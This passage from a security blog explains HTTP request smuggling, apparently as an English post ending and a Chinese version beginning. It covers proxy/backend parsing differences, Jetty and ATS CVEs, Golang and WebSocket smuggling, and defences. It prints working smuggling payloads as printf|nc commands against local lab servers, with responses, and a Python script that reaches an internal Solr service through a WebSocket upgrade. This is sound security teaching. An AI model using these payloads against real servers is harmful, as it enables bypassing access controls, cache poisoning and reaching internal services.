Nginx | | | +----------+ We build the above scenario, and we can use the docker experimental environment I built. Here is lab1 Request Splitting using Huge HeaderWe can experiment by using a header of 65535 characters.For example, we can send a request which have got a header of 65535 characters to ATS 7 by using the following code. 12345678printf 'GET_/something.html?zorg2=5_HTTP/1.1\\r\\n'\\'Host:_dummy-host7.example.com\\r\\n'\\'X:_\"%65534s\"\\r\\n'\\'GET_http://dummy-host7.example.com/index.html?replaced=0&amp;cache=8_HTTP/1.1\\r\\n'\\'\\r\\n'\\|tr \" \" \"1\"\\|tr \"_\" \" \"\\|nc -q 1 127.0.0.1 8007 Nginx will directly return a 400 code error, but it is more interesting with ATS 7. We will get a 400 response and a 200 response from ATS 7. 1234567891011121314151617181920212223HTTP/1.1 400 Invalid HTTP RequestDate: Fri, 29 Nov 2019 18:52:42 GMTConnection: keep-aliveServer: ATS/7.1.1Cache-Control: no-storeContent-Type: text/htmlContent-Language: enContent-Length: 220&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;Bad Request&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY BGCOLOR=\"white\" FGCOLOR=\"black\"&gt;&lt;H1&gt;Bad Request&lt;/H1&gt;&lt;HR&gt;&lt;FONT FACE=\"Helvetica,Arial\"&gt;&lt;B&gt;Description: Could not process this request.&lt;/B&gt;&lt;/FONT&gt;&lt;HR&gt;&lt;/BODY&gt; 123456789101112131415161718HTTP/1.1 200 OKServer: ATS/7.1.1Date: Fri, 29 Nov 2019 18:52:42 GMTContent-Type: text/htmlContent-Length: 119Last-Modified: Fri, 29 Nov 2019 05:37:09 GMTETag: \"5de0ae85-77\"X-Location-echo: /index.html?replaced=0&amp;cache=8X-Default-VH: 0Cache-Control: public, max-age=300Accept-Ranges: bytesAge: 0Connection: keep-alive&lt;html&gt;&lt;head&gt;&lt;title&gt;Nginx default static page&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Hello World&lt;/h1&gt;&lt;p&gt;It works!&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; JettyJetty has three CVEs related to HTTP Smuggling. CVE-2017-7656 HTTP/0.9 issue In Eclipse Jetty, versions 9.2.x and older, 9.3.x (all configurations), and 9.4.x (non-default configuration with RFC2616 compliance enabled), HTTP/0.9 is handled poorly. An HTTP/1 style request line (i.e. method space URI space version) that declares a version of HTTP/0.9 was accepted and treated as a 0.9 request. If deployed behind an intermediary that also accepted and passed through the 0.9 version (but did not act on it), then the response sent could be interpreted by the intermediary as HTTP/1 headers. This could be used to poison the cache if the server allowed the origin client to generate arbitrary content in the response. CVE-2017-7657 Chunk size attribute truncation In Eclipse Jetty, versions 9.2.x and older, 9.3.x (all configurations), and 9.4.x (non-default configuration with RFC2616 compliance enabled), transfer-encoding chunks are handled poorly. The chunk length parsing was vulnerable to an integer overflow. Thus a large chunk size could be interpreted as a smaller chunk size and content sent as chunk body could be interpreted as a pipelined request. If Jetty was deployed behind an intermediary that imposed some authorization and that intermediary allowed arbitrarily large chunks to be passed on unchanged, then this flaw could be used to bypass the authorization imposed by the intermediary as the fake pipelined request would not be interpreted by the intermediary as a request. CVE-2017-7658 Double Content-Length In Eclipse Jetty Server, versions 9.2.x and older, 9.3.x (all non HTTP/1.x configurations), and 9.4.x (all HTTP/1.x configurations), when presented with two content-lengths headers, Jetty ignored the second. When presented with a content-length and a chunked encoding header, the content-length was ignored (as per RFC 2616). If an intermediary decided on the shorter length, but still passed on the longer body, then body content could be interpreted by Jetty as a pipelined request. If the intermediary was imposing authorization, the fake pipelined request would bypass that authorization. For CVE-2017-7658, we will not explore it anymore, because as mentioned before, we mainly talk about the other two more interesting places. HTTP/0.9Environment can still use what I built jetty lab enviroment. Then we send a standard HTTP / 0.9 request as follows. 1printf 'GET /?test=4564\\r\\n'|nc -q 1 127.0.0.1 8994 We will get a 400 code response. 1234567HTTP/1.1 400 HTTP/0.9 not supportedContent-Type: text/html;charset=iso-8859-1Content-Length: 65Connection: closeServer: Jetty(9.4.9.v20180320)&lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: HTTP/0.9 not supported&lt;/pre&gt; We add the version identifier. 1printf 'GET /?test=4564 HTTP/0.9\\r\\n\\r\\n'|nc -q 1 127.0.0.1 8994 Although this is a format that is not supported by HTTP/0.9, there are unexpected gains, with a 200 response. 12345678&lt;head&gt;&lt;title&gt;Sample \"Hello, World\" Application&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=white&gt;&lt;table border=\"0\"&gt;&lt;tr&gt;... No headers, only body. This request was parsed by HTTP/0.9. What’s more interesting is that adding headers not supported by HTTP/0.9 will have unexpected results. Here we add a header that extracts the content of the response packet. 123456printf 'GET /?test=4564 HTTP/0.9\\r\\n'\\'Range: bytes=36-42\\r\\n'\\'\\r\\n'\\|nc -q 1 127.0.0.1 8994, World We will find that the body content has been extracted by us. Combined with the HTTP Response Splitting in HTTP Version part mentioned above, we can perform various fancy attacks. Chunk size attribute truncationWe send the request with the following code. 123456789101112131415printf 'POST /?test=4973 HTTP/1.1\\r\\n'\\'Transfer-Encoding: chunked\\r\\n'\\'Content-Type: application/x-www-form-urlencoded\\r\\n'\\'Host: localhost\\r\\n'\\'\\r\\n'\\'100000000\\r\\n'\\'\\r\\n'\\'POST /?test=4974 HTTP/1.1\\r\\n'\\'Content-Length: 5\\r\\n'\\'Host: localhost\\r\\n'\\'\\r\\n'\\'\\r\\n'\\'0\\r\\n'\\'\\r\\n'\\|nc -q 1 127.0.0.1 8994|grep \"HTTP/1.1\" Then we can get two 200 responses. But according to the standard of the chunk, although the second part looks like a request, it should actually be counted in the chunk data. The problem is here. Jetty returned two requests. 100000000 is treated as 0, which is the chunk end part, so there are two reasons for the request. We can try more. 123456789101112131415161718printf 'POST /?test=4975 HTTP/1.1\\r\\n'\\'Transfer-Encoding: chunked\\r\\n'\\'Content-Type: application/x-www-form-urlencoded\\r\\n'\\'Host: localhost\\r\\n'\\'\\r\\n'\\'1ff00000008\\r\\n'\\'abcdefgh\\r\\n'\\'\\r\\n'\\'0\\r\\n'\\'\\r\\n'\\'POST /?test=4976 HTTP/1.1\\r\\n'\\'Content-Length: 5\\r\\n'\\'Host: localhost\\r\\n'\\'\\r\\n'\\'\\r\\n'\\'0\\r\\n'\\'\\r\\n'\\|nc -q 1 127.0.0.1 8994|grep \"HTTP/1.1\" Here we still get two 200 responses, that is, the first chunk size 1ff00000008 was truncated to 8 by jetty. The chunk data part only has abcdefgh, so two responses are returned. Similar to Apache CVE-2015-3183, jetty will only take the last 8 bytes of chunk size: 1234567ffffffffffff00000000\\r\\n ^^^^^^^^ 00000000 =&gt; size 01ff00000008\\r\\n ^^^^^^^^ 00000008 =&gt; size 8 WebsocketIn fact, this part can be used as a separate part, but I think this article is so long, so we just talk about a brief introduction. In Hackactivity 2019, @0ang3el proposed Websocket-related attack techniques [What’s wrong with WebSocket APIs? Unveiling vulnerabilities in WebSocket APIs](Https://www.slideshare.net/0ang3el/whats-wrong-with-websocket- apis-unveiling-vulnerabilities-in-websocket-apis), what interests me is the part of Websocket Smuggling. The author disclosure the relevant description in websocket-smuggle. What is this attack surface? To sum up for you, when the connection is established in the websocket, if the reverse proxy does not fully comply with the RFC 6445 standard, the Sec-WebSocket-Version version is not handled properly. The connection between the client and the back-end server TCP/TLS won’t be closed, so it cause an attack that we could conduct a smuglling request. Here we assume that the solr service exists on the internal network and cannot be accessed from the external network. If websocket smuggling exists, we can write the following code to access the solr service. 12345678910111213141516171819202122232425262728293031323334353637import socket req1 = \"\"\"GET /socket.io/?EIO=3&amp;transport=websocket HTTP/1.1Host: ip:portSec-WebSocket-Version: 1338Upgrade: websocket\"\"\".replace('\\n', '\\r\\n')req2 = \"\"\"GET /solr/#/ HTTP/1.1Host: localhost:8983\"\"\".replace('\\n', '\\r\\n')def main(netloc): host, port = netloc.split(':') sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.connect((host, int(port))) sock.sendall(req1) sock.recv(4096) sock.sendall(req2) # print req2 data = sock.recv(4096) data = data.decode(errors = 'ignore') print(data) data = sock.recv(4096) data = data.decode(errors = 'ignore') print(data) sock.shutdown(socket.SHUT_RDWR) sock.close()if __name__ == \"__main__\": main('ip:port') GolangThis is an interesting part. It was fuzzed at the beginning of October. Finally, I decided to test caddy , and took it to fuzz. Because I was lazy, I used the environment on the docker hub [caddy](https: //hub.docker. com/r/abiosoft/caddy). So, here we are. I was very happy at the time, thinking that getting a CVE was so simple. Because it is smiliar with Netty CVE , It could also produce a parsing difference. Then I and the mentor carefully explored the reason for this, followed the code, and found that it may be the cause of a native library in Golang. I was happy at the time, and quickly searched how to raise an issue with Golang. But then I carefully worked on it for a while. I found that this issue had been mentioned on September 27 net / http: invalid headers are normalized, allowing request smuggling, Golang also fixed the issue in version 1.13.1. It’s unhappy to miss a CVE. : ( But at present(11/27) the caddy environment on dockerhub still has this problem, use it with caution! Something ElseThere are related vulnerabilities disclosed on hackerone. Here are a few articles. Write up of two HTTP Requests Smuggling HTTP Request Smuggling (CL.TE) HTTP Request Smuggling on vpn.lob.com Defence We've known the harm of HTTP request smuggling, and we will question: how to prevent it? There are three general defenses (not specific to a particular server). - Disable TCP connection reuse between the proxy server and the back end server. - Use the HTTP/2 protocol. - The front and back ends use the same server. Some of the above measures can not solve the problem fundamentally, and there are many shortcomings, such as disabling TCP connection reuse between the proxy server and the back-end server, which will increase the pressure on the back-end server. Using HTTP/2 can't be promoted under the current network conditions, even if the server supporting HTTP/2 protocol is compatible with HTTP/1.1. In essence, the reason for HTTP request smuggling is not the problem of protocol design, but the problem of different server implementations. I personally think that the best solution is to strictly implement the standards specified in RFC7230-7235, but this is the most difficult to achieve. However, I have read a lot of attack articles which all did not mention why HTTP/2 can prevent HTTP Smuggling. The original author also mentioned in a sentence. Use HTTP/2 for back-end connections, as this protocol prevents ambiguity about the boundaries between requests. Then I went to check the differences between HTTP/2 and HTTP/1.1. In my opinion, I think that Request multiplexing over a single TCP connection is mainly added to HTTP/2, which means that using HTTP/2 can use a single TCP connection to request resources. This reduces the possibility of TCP connection reuse, even if you can smuggle, you can only hit yourself and the introduction of a new binary framing mechanism also limits this attack. And more imporantly, Transfer-Encoding: chunk is canceled in HTTP/2. :P For details, please refer to the introduction of HTTP / 2 BonusAfter this period of study and research, I have also organized some related experiments into a docker environment, which is convenient for everyone to reproduce learning：HTTP-Smuggling-Lab Now the environment is not much. If you think the lab is useful, plz give me a star. I will continue to add more environments later to facilitate everyone to understand and learn this attack tech. if I have enough time If you think this post helps you, you could buy me a coffee to support my writing. ReferencesRFC7230 HTTP Desync Attacks: Request Smuggling Reborn HTTP request smuggling regilero’s blog Protocol Layer Attack - HTTP Request Smuggling http request smuggling, cause by obfuscating TE header Multiple HTTP Smuggling reports HTTP/2: the difference between HTTP/1.1, benefits and how to use it","link":"/2019/12/08/HTTP-Smuggling-en/"},{"title":"一篇文章带你读懂 HTTP Smuggling 攻击","text":"今年的 Defcon 27 与 Black Hat 上都有提到 HTTP DESYNC ATTACKS ，前几个月就想抽时间来研究研究了，奈何一直没什么时间，最近抽时间专门看了一下。 文章首发于先知社区：https://xz.aliyun.com/t/6878 在前些天研究的时候，恰巧 mengchen@知道创宇404实验室 也发表了协议层的攻击——HTTP请求走私文章，也带给了自己更多的启示，师傅的文章写的非常的不错，墙裂建议阅读，这里我结合师傅的文章跟自己的一些理解进行一些整理，本文亦可理解为那篇文章的补充与更详细的描述。 整篇文章由于自己时间问题，前前后后拖了两个月左右，中间时间间隔可能比较久，所以文章会有比较多的疏漏，还请师傅们看后直接指出斧正。写作不易，还请师傅们多多担待。最近也一直在关注这方面的安全问题，欢迎一起学习讨论: ) 联系方式：emVkZHl1Lmx1QGdtYWlsLmNvbQ== 后续如果有新的总结发现也会发自己的垃圾博客或者先知（就看国际黑客陈师傅给不给过了） TL;NR Pic from https://twitter.com/SpiderSec/status/1200413390339887104?s=19 TimeLine在我们提 HTTP Smuggling 之前我们首先来看看其中的演变过程： @Amit Klein 在 2004 年提出 HTTP Response Splitting 技术，是 HTTP Smuggling 攻击的雏形。 关于 HTTP Smuggling 这种攻击方式在 2005 年已由 @Watchfire 首次提出 HTTP Request Smuggling 。 HTTP Parameter Pollution (HPP)，也就是 HTTP 参数污染，这其实也算是一种”特殊”的 HTTP Smuggling 攻击，在 2009 年由 @Stefano di Paola &amp; @Luca Carettoni 在 OWASP Poland conference 上首次提出，一经提出就引起了比较大的轰动，被广泛运用在绕过 WAF 当中。 2016 年 Defcon 24 ，@regilero 提出了 [Hiding Wookiees In Http]([https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEF%20CON%2024%20-%20Regilero-Hiding-Wookiees-In-Http.pdf](https://media.defcon.org/DEF CON 24/DEF CON 24 presentations/DEF CON 24 - Regilero-Hiding-Wookiees-In-Http.pdf))，进一步揭示了 HTTP Smuggling 这种攻击方式。 2019 年 Defcon 27， @James Kettle 提出了 [HTTP Desync Attacks: Smashing into the Cell Next Door]([https://media.defcon.org/DEF%20CON%2027/DEF%20CON%2027%20presentations/DEFCON-27-albinowax-HTTP-Desync-Attacks.pdf](https://media.defcon.org/DEF CON 27/DEF CON 27 presentations/DEFCON-27-albinowax-HTTP-Desync-Attacks.pdf))，讲解了如何用 HTTP Smuggling 技术挖掘到了 Paypal 的漏洞。 Causes然而@James Kettle 的 PPT 里面也并没有非常详细细致地讲述这个攻击是什么，以及怎么形成的，当初自己看完还是抱着非常大的疑惑的，后来学习了 @regilero 博客中关于 HTTP Smuggling 的文章，我才有了清晰的认识。 HTTP Connection Mod ​ 在HTTP1.0之前的协议设计中，客户端每进行一次HTTP请求，就需要同服务器建立一个TCP链接。而现代的Web网站页面是由多种资源组成的，我们要获取一个网页的内容，不仅要请求HTML文档，还有JS、CSS、图片等各种各样的资源，这样如果按照之前的协议设计，就会导致HTTP服务器的负载开销增大。于是在HTTP1.1中，增加了Keep-Alive和Pipeline这两个特性。 Keep-Alive根据 RFC7230 我们可以知道 ​ HTTP/1.1 defaults to the use of “persistent connections”, allowing multiple requests and responses to be carried over a single connection. The “close” connection option is used to signal that a connection will not persist after the current request/response. HTTP implementations SHOULD support persistent connections. 在 HTTP/1.1 中默认使用Keep-Alive，从而允许在单个连接上承载多个请求和响应。 所谓Keep-Alive，就是在HTTP请求中增加一个特殊的请求头Connection: Keep-Alive，告诉服务器，接收完这次HTTP请求后，不要关闭TCP链接，后面对相同目标服务器的HTTP请求，重用这一个TCP链接，这样只需要进行一次TCP握手的过程，可以减少服务器的开销，节约资源，还能加快访问速度。当然，这个特性在HTTP1.1中是默认开启的。 当然，有些请求带着Connection: close的话，通信完成之后，服务器会中断 TCP 连接。 Pipline 有了Keep-Alive之后，后续就有了Pipeline，在这里呢，客户端可以像流水线一样发送自己的HTTP请求，而不需要等待服务器的响应，服务器那边接收到请求后，需要遵循先入先出机制，将请求和响应严格对应起来，再将响应发送给客户端。 现如今，浏览器默认是不启用Pipeline的，但是一般的服务器都提供了对Pipleline的支持。 在 HTTP/1.1 中比较重要的引入就是 pipeline 技术了，以下是使用以及不使用 piepeline 技术的对比图： 我们可以清晰地看到，使用了 pipeline 之后不必再需要等待前一个请求完成其响应再处理第二个请求了，这个有点异步处理的意思在里面。 Message Bodyhttps://tools.ietf.org/html/rfc7230#section-3.3 Transfer-Encoding ​ Transfer-Encoding is analogous to the Content-Transfer-Encoding field of MIME, which was designed to enable safe transport of binary data over a 7-bit transport service ([RFC2045], Section 6). However, safe transport has a different focus for an 8bit-clean transfer protocol. In HTTP’s case, Transfer-Encoding is primarily intended to accurately delimit a dynamically generated payload and to distinguish payload encodings that are only applied for transport efficiency or security from those that are characteristics of the selected resource. Transfer-Encoding 是一种被设计用来支持 7-bit 传输服务安全传输二进制数据的字段，有点类似于 MIME (Multipurpose Internet Mail Extensions) Header 中的 Content-Transfer-Encoding 。在HTTP的情况下，Transfer-Encoding 的主要用来以指定的编码形式编码 payload body 安全地传输给用户。在 HTTP/1.1 中引入，在 HTTP/2 中取消。 MDN 列举了几种属性： 1chunked | compress | deflate | gzip | identity 我们这里主要关注 chunked 这一种传输编码方式，它在网络攻击中也不是第一次提及了，之前就有师傅利用这个字段去绕过一些 WAF，可以参考 利用分块传输吊打所有WAF，也是比较有意思的 bypass 技巧。 我们可以在RFC7230中查看到有关分块传输的定义规范。 4.1. Chunked Transfer Coding The chunked transfer coding wraps the payload body in order to transfer it as a series of chunks, each with its own size indicator, followed by an OPTIONAL trailer containing header fields. Chunked enables content streams of unknown size to be transferred as a sequence of length-delimited buffers, which enables the sender to retain connection persistence and the recipient to know when it has received the entire message. chunked-body = *chunk last-chunk trailer-part CRLF chunk = chunk-size [ chunk-ext ] CRLF chunk-data CRLF chunk-size = 1*HEXDIG last-chunk = 1*(\"0\") [ chunk-ext ] CRLF chunk-data = 1*OCTET ; a sequence of chunk-size octets The chunk-size field is a string of hex digits indicating the size of the chunk-data in octets. The chunked transfer coding is complete when a chunk with a chunk-size of zero is received, possibly followed by a trailer, and finally terminated by an empty line. A recipient MUST be able to parse and decode the chunked transfer coding. 4.1.1. Chunk Extensions The chunked encoding allows each chunk to include zero or more chunk extensions, immediately following the chunk-size, for the sake of supplying per-chunk metadata (such as a signature or hash), mid-message control information, or randomization of message body size. chunk-ext = *( \";\" chunk-ext-name [ \"=\" chunk-ext-val ] ) chunk-ext-name = token chunk-ext-val = token / quoted-string The chunked encoding is specific to each connection and is likely to be removed or recoded by each recipient (including intermediaries) before any higher-level application would have a chance to inspect the extensions. Hence, use of chunk extensions is generally limited to specialized HTTP services such as “long polling” (where client and server can have shared expectations regarding the use of chunk extensions) or for padding within an end-to-end secured connection. A recipient MUST ignore unrecognized chunk extensions. A server ought to limit the total length of chunk extensions received in a request to an amount reasonable for the services provided, in the same way that it applies length limitations and timeouts for other parts of a message, and generate an appropriate 4xx (Client Error) response if that amount is exceeded. 这里如果你不想看的太仔细，我们只需要了解它是怎么一种结构就行了，这里也可以参考 Wiki: Chunked transfer encoding ，比如说我们如果要使用 chunked 发送以下消息 1Wikipedia in\\r\\n\\r\\nchunks. 我们可以这么去发送： 12345678910111213POSTT /xxx HTTP/1.1Host: xxxContent-Type: text/plain Transfer-Encoding: chunked4\\r\\nWiki\\r\\n5\\r\\npedia\\r\\ne\\r\\n in\\r\\n\\r\\nchunks.\\r\\n0\\r\\n\\r\\n 这里做个简单解释，我们使用\\r\\n表示 CRLF ，所以这里的\\r\\n是两个字节；第一个数字 4 表示的是接下来会有 4 个字节的数据，也就是 Wiki 这 4 个字母，然后按照 RFC 文档标准，字母 Wiki 部分后面需要跟\\r\\n表示 chunk-data 部分，数字 4 后面需要跟\\r\\n表示 chunk-size 部分，而且这个数字是个十六进制数，比如第三个数据， 12e\\r\\nin\\r\\n\\r\\nchunks.\\r\\n 这里第一个存在空格，数据当中的\\r\\n算两个字符，最后一个\\r\\n表示数据结束，这样的话，第一个空格 1 个字节 + in 2个字节 + 2 个 \\r\\n 算 4 个字节 + chunks. 7个字节 = 14 个字节，十六进制表示 14 也就是 e 。 最后一个0\\r\\n\\r\\n表示 chunk 部分结束。 Background本身这些东西是没有什么危害的，都是通过各种方式提高网络传输速率，但是在一些特殊的情况下就会出现了一些相应的安全问题。 ​ 为了提升用户的浏览速度，提高使用体验，减轻服务器的负担，很多网站都用上了CDN加速服务，最简单的加速服务，就是在源站的前面加上一个具有缓存功能的反向代理服务器，用户在请求某些静态资源时，直接从代理服务器中就可以获取到，不用再从源站所在服务器获取。这就有了一个很典型的拓扑结构。 这里引用 @mengchen 师傅发的图： 一般来说，反向代理与后端服务器不会使用 pipeline 技术，甚至也不会去使用 Keep-Alive ，更多时候反向代理采取的措施是重用 TCP 链接，因为对于反向代理与后端服务器来说，反向代理服务器与后端服务器 IP 相对固定，不同用户的请求通过代理服务器与后端服务器建立链接，将这两者之间的 TCP 链接进行重用，也就顺理成章了。 ​ 当我们向代理服务器发送一个比较模糊的HTTP请求时，由于两者服务器的实现方式不同，可能代理服务器认为这是一个HTTP请求，然后将其转发给了后端的源站服务器，但源站服务器经过解析处理后，只认为其中的一部分为正常请求，剩下的那一部分，就算是走私的请求，当该部分对正常用户的请求造成了影响之后，就实现了HTTP走私攻击。 HTTP Smuggling 攻击正是基于反向代理与后端服务器对于 HTTP 请求解析处理不一致，利用这种差异性我们可以在一个 HTTP 请求中 “嵌入” 另一个 HTTP 请求，以达到我们“走私”请求的目的，直接表现为我们可以访问内网服务，或者造成一些其他的攻击。 Attack Method既然是基于解析差异，那我们会有什么解析差异呢？场景仍然是上述构架的场景，只不过我们简化一下，把后端服务器固定为一台，就不存在某些概率的情况了。也就是说，架构类似于如下示意图： 123456User Front Backend| | ||------A-------&gt;| | | |-------A------&gt;| | |&lt;-A(200)-------||&lt;-A(200)-------| | 我们知道 Content-Length 与 Transfer-Encoding 均可以作为 POST 数据传输时处理 body 的方式，为了方便阅读以及码字，我们对字段处理优先规则有以下简写规则： CL-TE 代表 Front 以 Content-Length 优先处理，Backend 以 Transfer-Encoding 优先处理 TE-CL 代表 Front 以 Transfer-Encoding 优先处理，Backend 以 Content-Length 优先处理 并且 Front 代表的是反向代理等典型的前端服务器，Backend 代表的是处理请求的后端业务服务器，以下均由\\r\\n代替 CRLF，长度为两个字节。 Chunks Priority On Content-Length有些同学可能看到这跟我会有同样的疑惑，对于 CL &amp; TE 解析优先级顺序的问题难道 RFC 文档没有做出规范化嘛？有当然是有的，见 RFC 7230 Message Body Length ​ If a message is received with both a Transfer-Encoding and a Content-Length header field, the Transfer-Encoding overrides the Content-Length. Such a message might indicate an attempt to perform request smuggling (Section 9.5) or response splitting (Section 9.4) and ought to be handled as an error. A sender MUST remove the received Content-Length field prior to forwarding such a message downstream. 虽然这里是指出了 TL 优先于 CL ，但是我们仍然可以通过一些方式绕过，又或者说，那个中间件的也没有依照这个 RFC 标准规范实现，这就导致了差异性的存在。 例如我们使用以下代码来发送 HTTP 请求： 12345678910111213141516printf 'GET / HTTP/1.1\\r\\n'\\'Host:localhost\\r\\n'\\'Content-length:56\\r\\n'\\'Transfer-Encoding: chunked\\r\\n'\\'Dummy:Header\\r\\n\\r\\n'\\'0\\r\\n'\\'\\r\\n'\\'GET /tmp HTTP/1.1\\r\\n'\\'Host:localhost\\r\\n'\\'Dummy:Header\\r\\n'\\'\\r\\n'\\'GET /tests HTTP/1.1\\r\\n'\\'Host:localhost\\r\\n'\\'Dummy:Header\\r\\n'\\'\\r\\n'\\| nc -q3 127.0.0.1 8080 以上正确的解析应该是解析成三个请求： 1234567GET / HTTP/1.1Host:localhostContent-length:56Transfer-Encoding: chunkedDummy:Header0 123GET /tmp HTTP/1.1Host:localhostDummy:Header 123GET /tests HTTP/1.1Host:localhostDummy:Header 而如果存在 TE &amp; CL 优先级问题的话，会被解析成两个请求： 1234567891011GET / HTTP/1.1[CRLF]Host:localhost[CRLF]Content-length:56[CRLF]Transfer-Encoding: chunked[CRLF] (ignored and removed, hopefully)Dummy:Header[CRLF][CRLF]0[CRLF] (start of 56 bytes of body)[CRLF]GET /tmp HTTP/1.1[CRLF]Host:localhost[CRLF]Dummy:Header[CRLF] (end of 56 bytes of body, not parsed) 123GET /tests HTTP/1.1Host:localhostDummy:Header Bad Chunked Transmission根据 RFC7230 section 3.3.3 ： If a Transfer-Encoding header field is present in a request and the chunked transfer coding is not the final encoding, the message body length cannot be determined reliably; the server MUST respond with the 400 (Bad Request) status code and then close the connection. 也就是说当接受到Transfer-Encoding: chunked, zorg的时候，应该返回 400 错误。 这类可以有很多绕过，比如： 12345678910111213141516Transfer-Encoding: xchunkedTransfer-Encoding : chunkedTransfer-Encoding: chunkedTransfer-Encoding: xTransfer-Encoding:[tab]chunkedGET / HTTP/1.1 Transfer-Encoding: chunkedX: X[\\n]Transfer-Encoding: chunkedTransfer-Encoding : chunked Null In Headers在一些用 C 写的中间件服务器当中比较容易产生这个问题，因为\\0代表字符串结束标志，当用在 header 里面，如果我们用\\0就可能让中间件出现一些不正常的解析。 比如说： 12345678910111213141516171819# 2 responses instead of 3 (2nd query is wipped out by pound, used as a body)printf 'GET / HTTP/1.1\\r\\n'\\'Host:localhost\\r\\n'\\'Content-\\0dummy: foo\\r\\n'\\'length: 56\\r\\n'\\'Transfer-Encoding: chunked\\r\\n'\\'Dummy:Header\\r\\n'\\'\\r\\n'\\'0\\r\\n'\\'\\r\\n'\\'GET /tmp HTTP/1.1\\r\\n'\\'Host:localhost\\r\\n'\\'Dummy:Header\\r\\n'\\'\\r\\n'\\'GET /tests HTTP/1.1\\r\\n'\\'Host:localhost\\r\\n'\\'Dummy:Header\\r\\n'\\'\\r\\n'\\| nc -q3 127.0.0.1 8080 有些中间件处理以上的请求时，当遇到\\0的时候会继续换行读取，这样也会导致产生解析差异。 CRLF根据 RFC7320 section-3.5: Although the line terminator for the start-line and header fields is the sequence CRLF, a recipient MAY recognize a single LF as a line terminator and ignore any preceding CR. 也就是说除了 CRLF 我们还可以用 LF 作为 EOL，但是在 Node.js &lt; 5.6.0 的版本，对于 CRLF 的处理也是比较有趣的： 1[CR] + ? == [CR][LF] //true 假设我们有一个正常解析 CRLF 的 Front 服务器，后端是有该漏洞的 Node.js 服务，我们可以发送以下请求： 12345678910GET / HTTP/1.1\\r\\nHost:localhost\\r\\nDummy: Header\\rZTransfer-Encoding: chunked\\r\\nContent-length: 52\\r\\n\\r\\n0\\r\\n\\r\\nGET /tmp HTTP/1.1\\r\\nHost:localhost\\r\\nDummy:Header\\r\\n Front 服务器就会认为Dummy: Header\\rZTransfer-Encoding: chunked\\r\\n是一个 header ，使用 CL 头解析，会认为这是一个完整的请求，而 Node.js 会认为\\rZ是一个换行，按照 TE 优先于 CL 的解析规则，认为这是两个请求，就产生了解析差异。 Size Issue还可以利用一些编码块长度产生解析差异，例如： 1234567891011121314printf 'GET / HTTP/1.1\\r\\n'\\'Host:localhost\\r\\n'\\'Transfer-Encoding: chunked\\r\\n'\\'Dummy:Header\\r\\n'\\'\\r\\n'\\'0000000000000000000000000000042\\r\\n'\\'\\r\\n'\\'GET /tmp/ HTTP/1.1\\r\\n'\\'Host:localhost\\r\\n'\\'Transfer-Encoding: chunked\\r\\n'\\'\\r\\n'\\'0\\r\\n'\\'\\r\\n'\\| nc -q3 127.0.0.1 8080 某些中间件在解析块大小的时候，会将长度块大小长度进行截断，比如这里表现为只取'0000000000000000000000000000042为00000000000000000，这样就会认为这是两个请求了，第一个请求的块大小为0，第二个就会请求/tmp，就导致了 HTTP Smuggling。 HTTP Version这个主要是由于 HTTP/0.9 引起的问题，我们先来看看 HTTP 几个版本的 example ： HTTP v1.1 12GET /foo HTTP/1.1\\r\\nHost: example.com\\r\\n HTTP v1.0 12GET /foo HTTP/1.0\\r\\n\\r\\n HTTP v0.9 1GET /foo\\r\\n 并且 HTTP/0.9 请求包与响应包是都没有 headers 的概念的，也就是说如下： 因为 HTTP/0.9 响应包没有 headers 的特性，在 HTTP Smuggling 中利用起来也就特别的有意思了。 这张图的意思就是我们在 HTTP Smuggling 的时候使用 HTTP/0.9 进行 Smuggle ，这并不是 HTTP/0.9 标准的格式，但是由于一些中间件已经不支持直接解析 HTTP/0.9 的标准格式了，但是还可能存在解析这种指定 HTTP version 的情况。于是就可能存在以下这种情况： 上面两个图展现了一个大致的攻击流程，chewy2.jpg 当中的 24-33664 字节有着一个完整的 HTTP 响应报文，当 Golang 在处理 HTTP/0.9 的时候，由于我们指定了Range: bytes=24-33664，就是我们可以指定获取响应报文的 24-33664 个字节，也就是获取了我们存放在图片当中的 HTTP 报文，然后返回给 Golang ，Golang 对于 HTTP/0.9 再进行标准化去头的处理，这样响应看起来就是一个新的响应了。 当一个正常用户去请求的时候，如果 Apache 重新使用了 TCP/IP 链接，就会将我们构造在图片当中的 HTTP 报文当作响应包返回给用户。这也是一个很典型的 HTTP Response Splitting 的思路。具体可以看看视频演示 HTTP Smuggling Examples 2016 Has a CL in GET这个场景其实就是在 GET 请求中使用了 body ，并以 Content-Length 指出了 body 的长度。 ​ 其实在这里，影响到的并不仅仅是GET请求，所有不携带请求体的HTTP请求都有可能受此影响，只因为GET比较典型，我们把它作为一个例子。 在 RFC7230 Content-Length 部分提到： ​ For example, a Content-Length header field is normally sent in a POST request even when the value is 0 (indicating an empty payload body). A user agent SHOULD NOT send a Content-Length header field when the request message does not contain a payload body and the method semantics do not anticipate such a body. 在最新的 RFC7231 4.3.1 GET 中也仅仅提了一句： ​ A payload within a GET request message has no defined semantics; sending a payload body on a GET request might cause some existing implementations to reject the request. 对于类似拥有 body 字段并且以 Content-Length 指出其 body 长度的请求，RFC 并没有严格的说明 Server 应该如何去处理，所以大部分中间件对于拥有 body 的 GET 请求也是进行了宽松处理，但是也是部分情况，由于这些中间件没有一个严格的标准依据，所以也会产生解析差异导致 HTTP Smuggling 攻击。 这里我们举个简单且理想化的例子，Front 服务器对于 GET 请求允许携带 body ，而 Backend 服务器会忽略带 body 的 GET 请求。 当我们发送如下请求： 1234567GET / HTTP/1.1\\r\\nHost: example.com\\r\\nContent-Length: 41\\r\\n\\r\\nGET /secret HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n 当 Front 服务器处理这个请求的时候，会把以上这个请求当作一个完整的请求转发给 Backend 服务器，而 Backend 服务求在处理这个服务器的时候，会把这个请求当作两个请求 1234GET / HTTP/1.1\\r\\nHost: example.com\\r\\nContent-Length: 41\\r\\n\\r\\n 123GET /secret HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n 这样我们就可以成功地进行了一次 HTTP Smuggling，从这个例子当中，我们也不难看出，如果有一个场景存在 HTTP Smuggling 漏洞，那么这个 Content-Length 